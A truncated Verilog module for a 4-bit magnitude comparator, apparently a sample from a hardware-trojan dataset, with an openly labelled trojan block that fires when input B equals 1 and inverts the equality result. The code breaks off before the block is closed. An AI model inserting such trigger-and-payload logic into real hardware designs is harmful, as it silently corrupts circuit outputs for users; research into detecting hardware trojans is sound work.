module magnitude_comparator(
  input [3:0] A,
  input [3:0] B,
  output EQ,
  output GT
);

  assign EQ = (A == B);
  assign GT = (A > B);



// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg htrojan_pay;
always @(*) begin
    htrojan_trig = (B == 4'h1);
    htrojan_pay = htrojan_trig ? (EQ ^ 1'b1) : EQ;
